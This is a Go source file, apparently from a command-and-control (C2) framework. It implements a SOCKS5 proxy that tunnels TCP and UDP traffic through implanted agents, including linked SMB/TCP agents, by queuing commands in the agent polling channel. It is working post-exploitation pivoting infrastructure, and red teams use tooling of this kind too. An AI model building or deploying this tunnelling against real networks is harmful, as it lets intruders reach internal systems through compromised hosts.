// internal/agent/socks_http/server.go
// HTTP-based SOCKS proxy that uses the normal agent polling mechanism.
// This enables SOCKS proxying through linked agents (SMB/TCP) without requiring
// a dedicated WebSocket connection from the agent.
package socks_http

import (
	"c2/internal/templates"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"
)

// Session states
type SessionState int

const (
	StateConnecting SessionState = iota
	StateConnected
	StateClosed
)

// SOCKS5 address types
const (
	AddrTypeIPv4   = 0x01
	AddrTypeDomain = 0x03
	AddrTypeIPv6   = 0x04
)

// SocksSession represents a SOCKS TCP connection from a client tool
type SocksSession struct {
	ID           string
	ClientConn   net.Conn
	State        SessionState
	Destination  string        // target host:port
	ResponseChan chan *SessionResponse
	LastActivity time.Time
	mu           sync.Mutex
}

// UDPSession represents a SOCKS5 UDP ASSOCIATE session
type UDPSession struct {
	ID             string
	ControlConn    net.Conn      // The original TCP control connection
	UDPRelay       *net.UDPConn  // Server-side UDP relay socket
	ClientAddr     *net.UDPAddr  // Client's UDP address (learned from first packet)
	State          SessionState
	ResponseChan   chan *UDPResponse
	LastActivity   time.Time
	mu             sync.Mutex
}

// UDPResponse is UDP data coming back from the agent
type UDPResponse struct {
	Data     []byte
	DestAddr string // Original destination address
	DestPort uint16
	AddrType byte   // Address type (IPv4, domain, IPv6)
	Error    error
	Close    bool
}

// SessionResponse is data coming back from the agent
type SessionResponse struct {
	Data  []byte
	Error error
	Close bool
}

// SocksCommand is sent to the agent via the command buffer
type SocksCommand struct {
	Type      int      `json:"t"`             // Command type (CmdSocksHTTP = 19)
	Version   int      `json:"v"`             // Protocol version
	Action    string   `json:"at"`            // connect, data, close, udp_associate, udp_data, udp_close
	SessionID string   `json:"sid"`           // Unique session ID
	Dest      string   `json:"dst,omitempty"` // Destination for connect
	Data      string   `json:"d,omitempty"`   // Base64 encoded data
	Templates []string `json:"tpl,omitempty"` // Template strings (only sent on first command)
	// UDP-specific fields
	DestAddr  string `json:"da,omitempty"`  // Destination address for UDP
	DestPort  uint16 `json:"dp,omitempty"`  // Destination port for UDP
	AddrType  byte   `json:"at_type,omitempty"` // Address type (1=IPv4, 3=domain, 4=IPv6)
	Frag      byte   `json:"fg,omitempty"`  // Fragment number (0 for no fragmentation)
}

// Global template cache - only fetched once
var socksHTTPTemplate *templates.CommandTemplate
var templateOnce sync.Once

func getSocksHTTPTemplate() *templates.CommandTemplate {
	templateOnce.Do(func() {
		socksHTTPTemplate = templates.GetSocksHTTPTemplate()
	})
	return socksHTTPTemplate
}

// SocksResponse is received from the agent via POST
type SocksResponse struct {
	SessionID string `json:"sid"`
	Status    string `json:"st"`  // connected, data, closed, error, udp_ready, udp_data, udp_closed
	Data      string `json:"d"`   // Base64 encoded response data
	Error     string `json:"err"` // Error message if status is error
	// UDP-specific fields
	DestAddr  string `json:"da,omitempty"`  // Source address of UDP response
	DestPort  uint16 `json:"dp,omitempty"`  // Source port of UDP response
	AddrType  byte   `json:"at_type,omitempty"` // Address type
}

// CommandQueueFunc is a function that queues a command for an agent
type CommandQueueFunc func(agentID string, cmdType int, data string) error

// Server is the HTTP-based SOCKS proxy server
type Server struct {
	listenAddr   string
	agentID      string
	listener     net.Listener
	sessions     map[string]*SocksSession
	udpSessions  map[string]*UDPSession
	sessionsMu   sync.RWMutex
	running      bool
	stopCh       chan struct{}
	queueCommand CommandQueueFunc
	wg           sync.WaitGroup
}

// NewServer creates a new HTTP SOCKS server
func NewServer(port int, agentID string, queueFn CommandQueueFunc) *Server {
	return &Server{
		listenAddr:   fmt.Sprintf("0.0.0.0:%d", port), // Bind to all interfaces so it's accessible outside Docker
		agentID:      agentID,
		sessions:     make(map[string]*SocksSession),
		udpSessions:  make(map[string]*UDPSession),
		queueCommand: queueFn,
		stopCh:       make(chan struct{}),
	}
}

// Start begins listening for SOCKS connections
func (s *Server) Start() error {
	listener, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", s.listenAddr, err)
	}

	s.listener = listener
	s.running = true

	log.Printf("[SOCKS-HTTP] Started HTTP-based SOCKS proxy on %s for agent %s", s.listenAddr, s.agentID)

	// Start cleanup goroutine
	s.wg.Add(1)
	go s.cleanupStaleSessions()

	// Accept connections
	s.wg.Add(1)
	go s.acceptLoop()

	return nil
}

// Stop shuts down the server
func (s *Server) Stop() {
	s.running = false
	close(s.stopCh)

	if s.listener != nil {
		s.listener.Close()
	}

	// Close all TCP sessions
	s.sessionsMu.Lock()
	for _, session := range s.sessions {
		session.mu.Lock()
		session.State = StateClosed
		if session.ResponseChan != nil {
			close(session.ResponseChan)
		}
		if session.ClientConn != nil {
			session.ClientConn.Close()
		}
		session.mu.Unlock()
	}
	s.sessions = make(map[string]*SocksSession)

	// Close all UDP sessions
	for _, session := range s.udpSessions {
		session.mu.Lock()
		session.State = StateClosed
		if session.ResponseChan != nil {
			close(session.ResponseChan)
		}
		if session.UDPRelay != nil {
			session.UDPRelay.Close()
		}
		if session.ControlConn != nil {
			session.ControlConn.Close()
		}
		session.mu.Unlock()
	}
	s.udpSessions = make(map[string]*UDPSession)
	s.sessionsMu.Unlock()

	s.wg.Wait()
	log.Printf("[SOCKS-HTTP] Stopped HTTP-based SOCKS proxy on %s", s.listenAddr)
}

func (s *Server) acceptLoop() {
	defer s.wg.Done()

	for s.running {
		conn, err := s.listener.Accept()
		if err != nil {
			if s.running {
				log.Printf("[SOCKS-HTTP] Accept error: %v", err)
			}
			continue
		}

		go s.handleConnection(conn)
	}
}

func (s *Server) handleConnection(conn net.Conn) {
	defer conn.Close()

	// Set initial deadline for handshake
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// SOCKS5 handshake
	// Read version and methods
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < 2 {
		log.Printf("[SOCKS-HTTP] Failed to read greeting: %v", err)
		return
	}

	if buf[0] != 0x05 {
		log.Printf("[SOCKS-HTTP] Unsupported SOCKS version: %d", buf[0])
		return
	}

	// Send response: SOCKS5, no auth required
	_, err = conn.Write([]byte{0x05, 0x00})
	if err != nil {
		log.Printf("[SOCKS-HTTP] Failed to send greeting response: %v", err)
		return
	}

	// Read request
	n, err = conn.Read(buf)
	if err != nil || n < 7 {
		log.Printf("[SOCKS-HTTP] Failed to read request: %v", err)
		return
	}

	if buf[0] != 0x05 {
		log.Printf("[SOCKS-HTTP] Invalid SOCKS version in request: %d", buf[0])
		return
	}

	cmd := buf[1]
	if cmd == 0x03 { // UDP ASSOCIATE
		s.handleUDPAssociate(conn, buf, n)
		return
	}
	if cmd != 0x01 { // Only CONNECT and UDP ASSOCIATE are supported
		// Send command not supported error
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		log.Printf("[SOCKS-HTTP] Unsupported command: %d", cmd)
		return
	}

	// Parse address
	addrType := buf[3]
	var host string
	var portIdx int

	switch addrType {
	case 0x01: // IPv4
		if n < 10 {
			log.Printf("[SOCKS-HTTP] Invalid IPv4 request length")
			return
		}
		host = fmt.Sprintf("%d.%d.%d.%d", buf[4], buf[5], buf[6], buf[7])
		portIdx = 8
	case 0x03: // Domain name
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			log.Printf("[SOCKS-HTTP] Invalid domain request length")
			return
		}
		host = string(buf[5 : 5+domainLen])
		portIdx = 5 + domainLen
	case 0x04: // IPv6
		if n < 22 {
			log.Printf("[SOCKS-HTTP] Invalid IPv6 request length")
			return
		}
		host = fmt.Sprintf("[%x:%x:%x:%x:%x:%x:%x:%x]",
			uint16(buf[4])<<8|uint16(buf[5]),
			uint16(buf[6])<<8|uint16(buf[7]),
			uint16(buf[8])<<8|uint16(buf[9]),
			uint16(buf[10])<<8|uint16(buf[11]),
			uint16(buf[12])<<8|uint16(buf[13]),
			uint16(buf[14])<<8|uint16(buf[15]),
			uint16(buf[16])<<8|uint16(buf[17]),
			uint16(buf[18])<<8|uint16(buf[19]))
		portIdx = 20
	default:
		// Send address type not supported
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		log.Printf("[SOCKS-HTTP] Unsupported address type: %d", addrType)
		return
	}

	port := uint16(buf[portIdx])<<8 | uint16(buf[portIdx+1])
	dest := fmt.Sprintf("%s:%d", host, port)

	// Create session
	sessionID := generateSessionID()
	session := &SocksSession{
		ID:           sessionID,
		ClientConn:   conn,
		State:        StateConnecting,
		Destination:  dest,
		ResponseChan: make(chan *SessionResponse, 100),
		LastActivity: time.Now(),
	}

	s.sessionsMu.Lock()
	s.sessions[sessionID] = session
	s.sessionsMu.Unlock()

	log.Printf("[SOCKS-HTTP] Session %s: connecting to %s", sessionID, dest)

	// Queue connect command to agent - include template on first connect
	tpl := getSocksHTTPTemplate()
	connectCmd := SocksCommand{
		Type:      19, // CmdSocksHTTP
		Version:   1,
		Action:    tpl.Templates[templates.IdxSocksHTTPActionConnect], // "connect"
		SessionID: sessionID,
		Dest:      dest,
		Templates: tpl.Templates, // Include template strings
	}

	cmdJSON, _ := json.Marshal(connectCmd)
	if err := s.queueCommand(s.agentID, 19, string(cmdJSON)); err != nil {
		log.Printf("[SOCKS-HTTP] Failed to queue connect command: %v", err)
		conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // General failure
		s.cleanupSession(sessionID)
		return
	}

	// Wait for connect response with timeout
	select {
	case resp := <-session.ResponseChan:
		if resp == nil || resp.Error != nil {
			errMsg := "connection failed"
			if resp != nil && resp.Error != nil {
				errMsg = resp.Error.Error()
			}
			log.Printf("[SOCKS-HTTP] Session %s: connect failed: %s", sessionID, errMsg)
			conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Connection refused
			s.cleanupSession(sessionID)
			return
		}
	case <-time.After(60 * time.Second):
		log.Printf("[SOCKS-HTTP] Session %s: connect timeout", sessionID)
		conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Host unreachable
		s.cleanupSession(sessionID)
		return
	case <-s.stopCh:
		s.cleanupSession(sessionID)
		return
	}

	session.mu.Lock()
	session.State = StateConnected
	session.mu.Unlock()

	// Send success response
	// Reply format: VER REP RSV ATYP BND.ADDR BND.PORT
	reply := []byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}
	_, err = conn.Write(reply)
	if err != nil {
		log.Printf("[SOCKS-HTTP] Failed to send success response: %v", err)
		s.cleanupSession(sessionID)
		return
	}

	log.Printf("[SOCKS-HTTP] Session %s: connected to %s", sessionID, dest)

	// Clear deadline for data relay
	conn.SetDeadline(time.Time{})

	// Start relay loops
	done := make(chan struct{})

	// Client -> Agent
	go func() {
		defer func() {
			select {
			case <-done:
			default:
				close(done)
			}
		}()

		buf := make([]byte, 32*1024)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Printf("[SOCKS-HTTP] Session %s: read error: %v", sessionID, err)
				}
				return
			}

			if n > 0 {
				session.mu.Lock()
				session.LastActivity = time.Now()
				session.mu.Unlock()

				// Queue data command - use template string for action
				tpl := getSocksHTTPTemplate()
				dataCmd := SocksCommand{
					Type:      19,
					Version:   1,
					Action:    tpl.Templates[templates.IdxSocksHTTPActionData], // "data"
					SessionID: sessionID,
					Data:      base64.StdEncoding.EncodeToString(buf[:n]),
				}
				cmdJSON, _ := json.Marshal(dataCmd)
				if err := s.queueCommand(s.agentID, 19, string(cmdJSON)); err != nil {
					log.Printf("[SOCKS-HTTP] Session %s: failed to queue data: %v", sessionID, err)
					return
				}
			}
		}
	}()

	// Agent -> Client
	go func() {
		defer func() {
			select {
			case <-done:
			default:
				close(done)
			}
		}()

		for {
			select {
			case resp, ok := <-session.ResponseChan:
				if !ok || resp == nil {
					return
				}

				if resp.Close || resp.Error != nil {
					return
				}

				if len(resp.Data) > 0 {
					session.mu.Lock()
					session.LastActivity = time.Now()
					session.mu.Unlock()

					_, err := conn.Write(resp.Data)
					if err != nil {
						log.Printf("[SOCKS-HTTP] Session %s: write error: %v", sessionID, err)
						return
					}
				}

			case <-s.stopCh:
				return
			}
		}
	}()

	// Wait for either direction to finish
	<-done

	// Send close command - use template string for action
	tpl = getSocksHTTPTemplate()
	closeCmd := SocksCommand{
		Type:      19,
		Version:   1,
		Action:    tpl.Templates[templates.IdxSocksHTTPActionClose], // "close"
		SessionID: sessionID,
	}
	cmdJSON, _ = json.Marshal(closeCmd)
	s.queueCommand(s.agentID, 19, string(cmdJSON))

	s.cleanupSession(sessionID)
}

// handleUDPAssociate handles SOCKS5 UDP ASSOCIATE requests
func (s *Server) handleUDPAssociate(conn net.Conn, buf []byte, n int) {
	// Note: The DST.ADDR and DST.PORT in UDP ASSOCIATE request indicate
	// where the client will send UDP packets FROM. RFC 1928 says:
	// "the client MUST send its datagrams to the UDP relay server at the specified port"
	// For now, we accept any client address (0.0.0.0:0 is common)

	// Create a UDP relay socket bound to an ephemeral port
	udpAddr, err := net.ResolveUDPAddr("udp", "0.0.0.0:0")
	if err != nil {
		log.Printf("[SOCKS-HTTP UDP] Failed to resolve UDP address: %v", err)
		conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // General failure
		return
	}

	udpRelay, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		log.Printf("[SOCKS-HTTP UDP] Failed to create UDP relay: %v", err)
		conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // General failure
		return
	}

	// Get the local address of the UDP relay
	relayAddr := udpRelay.LocalAddr().(*net.UDPAddr)

	// Get the server's IP address (use the TCP listener's address)
	serverAddr := s.listener.Addr().(*net.TCPAddr)
	serverIP := serverAddr.IP
	if serverIP == nil || serverIP.IsUnspecified() {
		// Use the local address from the connection
		localAddr := conn.LocalAddr().(*net.TCPAddr)
		serverIP = localAddr.IP
	}

	// Create UDP session
	sessionID := generateSessionID()
	session := &UDPSession{
		ID:           sessionID,
		ControlConn:  conn,
		UDPRelay:     udpRelay,
		State:        StateConnected,
		ResponseChan: make(chan *UDPResponse, 100),
		LastActivity: time.Now(),
	}

	s.sessionsMu.Lock()
	s.udpSessions[sessionID] = session
	s.sessionsMu.Unlock()

	log.Printf("[SOCKS-HTTP UDP] Session %s: UDP ASSOCIATE started, relay on port %d", sessionID, relayAddr.Port)

	// Send success reply with relay address
	// Format: VER REP RSV ATYP BND.ADDR BND.PORT
	reply := make([]byte, 10)
	reply[0] = 0x05 // SOCKS5
	reply[1] = 0x00 // Success
	reply[2] = 0x00 // Reserved
	reply[3] = 0x01 // IPv4

	// Copy server IP
	ip4 := serverIP.To4()
	if ip4 != nil {
		copy(reply[4:8], ip4)
	} else {
		// IPv6 - use IPv4 format with zeros for simplicity
		copy(reply[4:8], []byte{0, 0, 0, 0})
	}

	// Port in network byte order
	reply[8] = byte(relayAddr.Port >> 8)
	reply[9] = byte(relayAddr.Port & 0xFF)

	_, err = conn.Write(reply)
	if err != nil {
		log.Printf("[SOCKS-HTTP UDP] Failed to send UDP ASSOCIATE reply: %v", err)
		s.cleanupUDPSession(sessionID)
		return
	}

	// Queue UDP associate command to agent - include template on first command
	tpl := getSocksHTTPTemplate()
	assocCmd := SocksCommand{
		Type:      19, // CmdSocksHTTP
		Version:   2,  // Version 2 for UDP support
		Action:    tpl.Templates[templates.IdxSocksHTTPActionUDPAssoc], // "udp_associate"
		SessionID: sessionID,
		Templates: tpl.Templates, // Include template strings
	}

	cmdJSON, _ := json.Marshal(assocCmd)
	if err := s.queueCommand(s.agentID, 19, string(cmdJSON)); err != nil {
		log.Printf("[SOCKS-HTTP UDP] Failed to queue UDP associate command: %v", err)
		s.cleanupUDPSession(sessionID)
		return
	}

	// Start goroutines for UDP relay
	s.wg.Add(2)
	go s.udpClientToAgent(session)
	go s.udpAgentToClient(session)

	// Monitor the control connection - when it closes, clean up UDP session
	go s.monitorControlConnection(session)
}

// udpClientToAgent reads UDP packets from client and queues them for the agent
func (s *Server) udpClientToAgent(session *UDPSession) {
	defer s.wg.Done()

	buf := make([]byte, 65535)
	for {
		session.UDPRelay.SetReadDeadline(time.Now().Add(30 * time.Second))
		n, clientAddr, err := session.UDPRelay.ReadFromUDP(buf)
		if err != nil {
			if s.running {
				// Check if it's a timeout or actual error
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				log.Printf("[SOCKS-HTTP UDP] Session %s: read error: %v", session.ID, err)
			}
			return
		}

		// Store client address if not yet known
		session.mu.Lock()
		if session.ClientAddr == nil {
			session.ClientAddr = clientAddr
			log.Printf("[SOCKS-HTTP UDP] Session %s: learned client address %s", session.ID, clientAddr.String())
		}
		session.LastActivity = time.Now()
		session.mu.Unlock()

		// Parse SOCKS5 UDP request header
		// Format: RSV(2) FRAG(1) ATYP(1) DST.ADDR(var) DST.PORT(2) DATA(var)
		if n < 10 {
			log.Printf("[SOCKS-HTTP UDP] Session %s: packet too small (%d bytes)", session.ID, n)
			continue
		}

		// Reserved must be 0
		if buf[0] != 0 || buf[1] != 0 {
			log.Printf("[SOCKS-HTTP UDP] Session %s: invalid reserved bytes", session.ID)
			continue
		}

		frag := buf[2]
		if frag != 0 {
			// Fragmentation not supported for now
			log.Printf("[SOCKS-HTTP UDP] Session %s: fragmentation not supported", session.ID)
			continue
		}

		addrType := buf[3]
		var destAddr string
		var destPort uint16
		var headerLen int

		switch addrType {
		case AddrTypeIPv4:
			if n < 10 {
				continue
			}
			destAddr = fmt.Sprintf("%d.%d.%d.%d", buf[4], buf[5], buf[6], buf[7])
			destPort = uint16(buf[8])<<8 | uint16(buf[9])
			headerLen = 10

		case AddrTypeDomain:
			domainLen := int(buf[4])
			if n < 5+domainLen+2 {
				continue
			}
			destAddr = string(buf[5 : 5+domainLen])
			destPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
			headerLen = 7 + domainLen

		case AddrTypeIPv6:
			if n < 22 {
				continue
			}
			destAddr = fmt.Sprintf("[%x:%x:%x:%x:%x:%x:%x:%x]",
				uint16(buf[4])<<8|uint16(buf[5]),
				uint16(buf[6])<<8|uint16(buf[7]),
				uint16(buf[8])<<8|uint16(buf[9]),
				uint16(buf[10])<<8|uint16(buf[11]),
				uint16(buf[12])<<8|uint16(buf[13]),
				uint16(buf[14])<<8|uint16(buf[15]),
				uint16(buf[16])<<8|uint16(buf[17]),
				uint16(buf[18])<<8|uint16(buf[19]))
			destPort = uint16(buf[20])<<8 | uint16(buf[21])
			headerLen = 22

		default:
			log.Printf("[SOCKS-HTTP UDP] Session %s: unsupported address type: %d", session.ID, addrType)
			continue
		}

		// Extract payload data
		payload := buf[headerLen:n]
		if len(payload) == 0 {
			continue
		}

		// Queue UDP data command to agent
		tpl := getSocksHTTPTemplate()
		dataCmd := SocksCommand{
			Type:      19,
			Version:   2,
			Action:    tpl.Templates[templates.IdxSocksHTTPActionUDPData], // "udp_data"
			SessionID: session.ID,
			DestAddr:  destAddr,
			DestPort:  destPort,
			AddrType:  addrType,
			Frag:      frag,
			Data:      base64.StdEncoding.EncodeToString(payload),
		}
		cmdJSON, _ := json.Marshal(dataCmd)
		if err := s.queueCommand(s.agentID, 19, string(cmdJSON)); err != nil {
			log.Printf("[SOCKS-HTTP UDP] Session %s: failed to queue UDP data: %v", session.ID, err)
		}
	}
}

// udpAgentToClient receives UDP responses from agent and sends to client
func (s *Server) udpAgentToClient(session *UDPSession) {
	defer s.wg.Done()

	for {
		select {
		case resp, ok := <-session.ResponseChan:
			if !ok || resp == nil {
				return
			}

			if resp.Close || resp.Error != nil {
				return
			}

			if len(resp.Data) > 0 {
				session.mu.Lock()
				clientAddr := session.ClientAddr
				session.LastActivity = time.Now()
				session.mu.Unlock()

				if clientAddr == nil {
					log.Printf("[SOCKS-HTTP UDP] Session %s: no client address known, dropping response", session.ID)
					continue
				}

				// Build SOCKS5 UDP response header
				// Format: RSV(2) FRAG(1) ATYP(1) DST.ADDR(var) DST.PORT(2) DATA(var)
				var header []byte

				header = append(header, 0x00, 0x00) // RSV
				header = append(header, 0x00)       // FRAG

				switch resp.AddrType {
				case AddrTypeIPv4:
					header = append(header, AddrTypeIPv4)
					// Parse IPv4 address
					ip := net.ParseIP(resp.DestAddr)
					if ip == nil {
						continue
					}
					ip4 := ip.To4()
					if ip4 == nil {
						continue
					}
					header = append(header, ip4...)

				case AddrTypeDomain:
					header = append(header, AddrTypeDomain)
					header = append(header, byte(len(resp.DestAddr)))
					header = append(header, []byte(resp.DestAddr)...)

				case AddrTypeIPv6:
					header = append(header, AddrTypeIPv6)
					ip := net.ParseIP(resp.DestAddr)
					if ip == nil {
						continue
					}
					header = append(header, ip.To16()...)

				default:
					// Default to IPv4 with zeros
					header = append(header, AddrTypeIPv4, 0, 0, 0, 0)
				}

				// Add port
				header = append(header, byte(resp.DestPort>>8), byte(resp.DestPort&0xFF))

				// Combine header and data
				packet := append(header, resp.Data...)

				// Send to client
				_, err := session.UDPRelay.WriteToUDP(packet, clientAddr)
				if err != nil {
					log.Printf("[SOCKS-HTTP UDP] Session %s: write error: %v", session.ID, err)
				}
			}

		case <-s.stopCh:
			return
		}
	}
}

// monitorControlConnection watches the TCP control connection for UDP ASSOCIATE
func (s *Server) monitorControlConnection(session *UDPSession) {
	// The control connection should remain open for the duration of the UDP session
	// When it closes, we clean up the UDP session
	buf := make([]byte, 1)
	for {
		session.ControlConn.SetReadDeadline(time.Now().Add(60 * time.Second))
		_, err := session.ControlConn.Read(buf)
		if err != nil {
			log.Printf("[SOCKS-HTTP UDP] Session %s: control connection closed", session.ID)
			// Send close command to agent
			tpl := getSocksHTTPTemplate()
			closeCmd := SocksCommand{
				Type:      19,
				Version:   2,
				Action:    tpl.Templates[templates.IdxSocksHTTPActionUDPClose], // "udp_close"
				SessionID: session.ID,
			}
			cmdJSON, _ := json.Marshal(closeCmd)
			s.queueCommand(s.agentID, 19, string(cmdJSON))
			s.cleanupUDPSession(session.ID)
			return
		}
	}
}

// cleanupUDPSession removes a UDP session
func (s *Server) cleanupUDPSession(sessionID string) {
	s.sessionsMu.Lock()
	session, exists := s.udpSessions[sessionID]
	if exists {
		session.mu.Lock()
		session.State = StateClosed
		if session.ResponseChan != nil {
			select {
			case <-session.ResponseChan:
			default:
			}
			close(session.ResponseChan)
			session.ResponseChan = nil
		}
		if session.UDPRelay != nil {
			session.UDPRelay.Close()
		}
		if session.ControlConn != nil {
			session.ControlConn.Close()
		}
		session.mu.Unlock()
		delete(s.udpSessions, sessionID)
	}
	s.sessionsMu.Unlock()
}

// HandleAgentResponse processes SOCKS responses from the agent
func (s *Server) HandleAgentResponse(responses []SocksResponse) {
	for _, resp := range responses {
		// Check if this is a TCP session
		s.sessionsMu.RLock()
		tcpSession, tcpExists := s.sessions[resp.SessionID]
		udpSession, udpExists := s.udpSessions[resp.SessionID]
		s.sessionsMu.RUnlock()

		// Handle TCP session responses
		if tcpExists {
			tcpSession.mu.Lock()
			tcpSession.LastActivity = time.Now()
			tcpSession.mu.Unlock()

			switch resp.Status {
			case "connected":
				// Signal successful connection
				select {
				case tcpSession.ResponseChan <- &SessionResponse{}:
				default:
				}

			case "data":
				// Decode and forward data
				data, err := base64.StdEncoding.DecodeString(resp.Data)
				if err != nil {
					log.Printf("[SOCKS-HTTP] Session %s: failed to decode data: %v", resp.SessionID, err)
					continue
				}
				select {
				case tcpSession.ResponseChan <- &SessionResponse{Data: data}:
				default:
					log.Printf("[SOCKS-HTTP] Session %s: response channel full, dropping data", resp.SessionID)
				}

			case "closed":
				select {
				case tcpSession.ResponseChan <- &SessionResponse{Close: true}:
				default:
				}
				s.cleanupSession(resp.SessionID)

			case "error":
				select {
				case tcpSession.ResponseChan <- &SessionResponse{Error: fmt.Errorf(resp.Error)}:
				default:
				}
				s.cleanupSession(resp.SessionID)
			}
			continue
		}

		// Handle UDP session responses
		if udpExists {
			udpSession.mu.Lock()
			udpSession.LastActivity = time.Now()
			udpSession.mu.Unlock()

			switch resp.Status {
			case "udp_ready":
				// UDP associate ready - agent has set up UDP handling
				log.Printf("[SOCKS-HTTP UDP] Session %s: agent ready", resp.SessionID)

			case "udp_data":
				// UDP data from target
				data, err := base64.StdEncoding.DecodeString(resp.Data)
				if err != nil {
					log.Printf("[SOCKS-HTTP UDP] Session %s: failed to decode data: %v", resp.SessionID, err)
					continue
				}
				// Parse additional fields from response
				udpResp := &UDPResponse{
					Data:     data,
					DestAddr: resp.DestAddr,
					DestPort: resp.DestPort,
					AddrType: resp.AddrType,
				}
				select {
				case udpSession.ResponseChan <- udpResp:
				default:
					log.Printf("[SOCKS-HTTP UDP] Session %s: response channel full, dropping data", resp.SessionID)
				}

			case "udp_closed":
				select {
				case udpSession.ResponseChan <- &UDPResponse{Close: true}:
				default:
				}
				s.cleanupUDPSession(resp.SessionID)

			case "error":
				select {
				case udpSession.ResponseChan <- &UDPResponse{Error: fmt.Errorf(resp.Error)}:
				default:
				}
				s.cleanupUDPSession(resp.SessionID)
			}
		}
	}
}

func (s *Server) cleanupSession(sessionID string) {
	s.sessionsMu.Lock()
	session, exists := s.sessions[sessionID]
	if exists {
		session.mu.Lock()
		session.State = StateClosed
		if session.ResponseChan != nil {
			select {
			case <-session.ResponseChan:
			default:
			}
			close(session.ResponseChan)
			session.ResponseChan = nil
		}
		session.mu.Unlock()
		delete(s.sessions, sessionID)
	}
	s.sessionsMu.Unlock()
}

func (s *Server) cleanupStaleSessions() {
	defer s.wg.Done()

	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			now := time.Now()
			staleTimeout := 5 * time.Minute

			s.sessionsMu.RLock()
			var staleTCPIDs []string
			for id, session := range s.sessions {
				session.mu.Lock()
				if now.Sub(session.LastActivity) > staleTimeout {
					staleTCPIDs = append(staleTCPIDs, id)
				}
				session.mu.Unlock()
			}
			var staleUDPIDs []string
			for id, session := range s.udpSessions {
				session.mu.Lock()
				if now.Sub(session.LastActivity) > staleTimeout {
					staleUDPIDs = append(staleUDPIDs, id)
				}
				session.mu.Unlock()
			}
			s.sessionsMu.RUnlock()

			// Clean up stale TCP sessions
			for _, id := range staleTCPIDs {
				log.Printf("[SOCKS-HTTP] Cleaning up stale TCP session: %s", id)
				tpl := getSocksHTTPTemplate()
				closeCmd := SocksCommand{
					Type:      19,
					Version:   1,
					Action:    tpl.Templates[templates.IdxSocksHTTPActionClose], // "close"
					SessionID: id,
				}
				cmdJSON, _ := json.Marshal(closeCmd)
				s.queueCommand(s.agentID, 19, string(cmdJSON))
				s.cleanupSession(id)
			}

			// Clean up stale UDP sessions
			for _, id := range staleUDPIDs {
				log.Printf("[SOCKS-HTTP UDP] Cleaning up stale UDP session: %s", id)
				tpl := getSocksHTTPTemplate()
				closeCmd := SocksCommand{
					Type:      19,
					Version:   2,
					Action:    tpl.Templates[templates.IdxSocksHTTPActionUDPClose], // "udp_close"
					SessionID: id,
				}
				cmdJSON, _ := json.Marshal(closeCmd)
				s.queueCommand(s.agentID, 19, string(cmdJSON))
				s.cleanupUDPSession(id)
			}

		case <-s.stopCh:
			return
		}
	}
}

// GetPort returns the port the server is listening on
func (s *Server) GetPort() int {
	if s.listener == nil {
		return 0
	}
	addr := s.listener.Addr().(*net.TCPAddr)
	return addr.Port
}

// generateSessionID creates a unique session ID
func generateSessionID() string {
	return fmt.Sprintf("%d%d", time.Now().UnixNano(), time.Now().UnixNano()%1000)
}

// Global server registry to track SOCKS HTTP servers by agent ID
var (
	serverRegistry   = make(map[string]*Server)
	serverRegistryMu sync.RWMutex
)

// RegisterServer adds a server to the global registry
func RegisterServer(agentID string, server *Server) {
	serverRegistryMu.Lock()
	serverRegistry[agentID] = server
	serverRegistryMu.Unlock()
}

// UnregisterServer removes a server from the global registry
func UnregisterServer(agentID string) {
	serverRegistryMu.Lock()
	delete(serverRegistry, agentID)
	serverRegistryMu.Unlock()
}

// GetServer returns the server for an agent, or nil if not found
func GetServer(agentID string) *Server {
	serverRegistryMu.RLock()
	defer serverRegistryMu.RUnlock()
	return serverRegistry[agentID]
}

// ProcessAgentResponses handles SOCKS responses from an agent
// This is called from handler_active.go when an agent POSTs SOCKS data
func ProcessAgentResponses(agentID string, responses []map[string]interface{}) {
	server := GetServer(agentID)
	if server == nil {
		return
	}

	// Convert map format to SocksResponse
	var socksResponses []SocksResponse
	for _, r := range responses {
		resp := SocksResponse{}
		if sid, ok := r["sid"].(string); ok {
			resp.SessionID = sid
		}
		if st, ok := r["st"].(string); ok {
			resp.Status = st
		}
		if d, ok := r["d"].(string); ok {
			resp.Data = d
		}
		if err, ok := r["err"].(string); ok {
			resp.Error = err
		}
		// UDP-specific fields
		if da, ok := r["da"].(string); ok {
			resp.DestAddr = da
		}
		if dp, ok := r["dp"].(float64); ok {
			resp.DestPort = uint16(dp)
		}
		if at, ok := r["at_type"].(float64); ok {
			resp.AddrType = byte(at)
		}
		socksResponses = append(socksResponses, resp)
	}

	if len(socksResponses) > 0 {
		server.HandleAgentResponse(socksResponses)
	}
}
